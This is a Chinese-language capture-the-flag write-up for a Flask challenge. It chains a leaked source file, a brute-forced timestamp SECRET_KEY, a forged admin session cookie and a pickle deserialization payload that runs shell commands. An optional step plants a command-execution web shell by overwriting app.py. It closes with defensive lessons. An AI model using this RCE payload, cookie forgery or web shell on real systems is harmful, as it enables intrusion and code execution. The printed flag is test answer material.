# Myflask

## 题目简述

访问根路由可直接下载 Flask 应用源码。源码暴露了两个可串联的弱点：会话签名密钥是进程启动时的六位时间字符串，可在很小的空间内爆破；`/flag` 对管理员提交的数据直接执行 `pickle.loads`，可触发任意代码执行。

## 解题过程

### 审计源码

题目核心逻辑如下：

```python
import base64
import pickle
from datetime import datetime

from flask import Flask, request, send_file, session
from pytz import timezone

current_time = datetime.now(timezone("Asia/Shanghai")).strftime("%H%M%S")

app = Flask(__name__)
app.config["SECRET_KEY"] = current_time


@app.route("/")
def index():
    session["username"] = "guest"
    return send_file("app.py")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if not session:
        return "There is no session available in your client :("
    if request.method == "GET":
        return "You are {} now".format(session["username"])

    if session["username"] == "admin":
        pickle_data = base64.b64decode(request.form.get("pickle_data"))
        userdata = pickle.loads(pickle_data)
        return userdata
    return "Access Denied"


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
```

访问 `/` 后，服务器先把当前会话身份设置为 `guest`，再返回 `app.py`。要进入危险的反序列化分支，必须先伪造 `username=admin` 的有效 Flask Session Cookie。

### 爆破并伪造 Flask Session

`SECRET_KEY` 仅由进程启动时的 `HHMMSS` 构成，理论空间只有 $24\times60\times60=86400$ 个有效时间；即使按 `000000` 到 `999999` 枚举也只有一百万项。先保存浏览器中的 `session` Cookie，然后使用 `flask-unsign` 测试六位数字字典：

```bash
flask-unsign --unsign \
  --cookie 'replace-with-guest-session' \
  --no-literal-eval \
  --wordlist 6-digits-000000-999999.txt
```

官方题解实例爆破得到：

```text
134609
```

该值与靶机实例的启动时间相关；重启或重建实例后应重新爆破，不能把示例值当作固定密钥。得到密钥后，把会话内容改为管理员并重新签名：

```bash
flask-unsign --sign \
  --cookie "{'username': 'admin'}" \
  --secret '134609'
```

将输出写入浏览器的 `session` Cookie，访问 `/flag`，页面返回 `You are admin now` 即说明伪造成功。

### 构造 Pickle 载荷读取 flag

POST 分支会先 Base64 解码参数，再无过滤地执行 `pickle.loads`。通过 `__reduce__` 指定反序列化期间调用的函数，可以直接执行命令并让表达式返回字符串：

```python
import base64
import pickle
from urllib.parse import urlencode


class Payload:
    def __reduce__(self):
        expression = "__import__('os').popen('cat /flag').read()"
        return eval, (expression,)


encoded = base64.b64encode(pickle.dumps(Payload())).decode()
print(urlencode({"pickle_data": encoded}))
```

带着伪造后的 Session Cookie，把输出作为 `application/x-www-form-urlencoded` 请求体 POST 到 `/flag`。`eval` 的返回值就是 `/flag` 内容，Flask 会将其直接作为响应返回：

```text
hgame{a6877d3c0faa6f7185020079a10ebbdb6b7719358}
```

原题解还给出 `(open, ('/flag', 'r'))` 形式的任意文件读取载荷；返回字符串的写法对 Flask 视图返回类型更稳定，也直接覆盖了读取 flag 的目标。

### 可选：利用调试重载获得带回显命令执行

这一步不是取得 flag 的必要条件，但可以解释官方题解中的完整利用链。先用同类 Pickle 载荷读取 `/proc/self/cmdline`，确认入口脚本为 `app.py`。由于程序以 `debug=True` 启动，调试重载器会在源码变化后重新加载应用。可准备一个仅用于题目环境的替代脚本：

```python
import os

from flask import Flask, request

app = Flask(__name__)


@app.route("/cmd", methods=["POST"])
def command():
    return os.popen(request.form.get("cmd", "")).read()


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
```

将该脚本 Base64 编码，再让 Pickle 载荷执行形如 `echo ENCODED | base64 -d > app.py` 的命令。文件改动触发自动重载后，POST `/cmd` 并提交 `cmd=id`、`cmd=whoami` 等命令即可获得回显。实际复现时应先读取并备份原文件，并避免在非题目环境覆盖应用源码。

## 方法总结

- 完整链路是“源码泄露 → 爆破低熵 `SECRET_KEY` → 伪造管理员 Session → 不安全 Pickle 反序列化”。任一环节单独看都不足以进入最终分支，组合后才形成 RCE。
- 时间戳不是合格密钥：格式可预测、空间很小，而且 Flask Cookie 为离线验签提供了明确判据。
- `pickle.loads` 只能处理可信数据；Base64 只是编码，不提供真实性或完整性保护。需要传输结构化不可信数据时，应改用 JSON 等无执行语义的格式并做严格校验。
- Flask 调试模式不应暴露在生产环境；自动重载、详细错误和调试器都会放大已有文件写入或代码执行漏洞的影响。
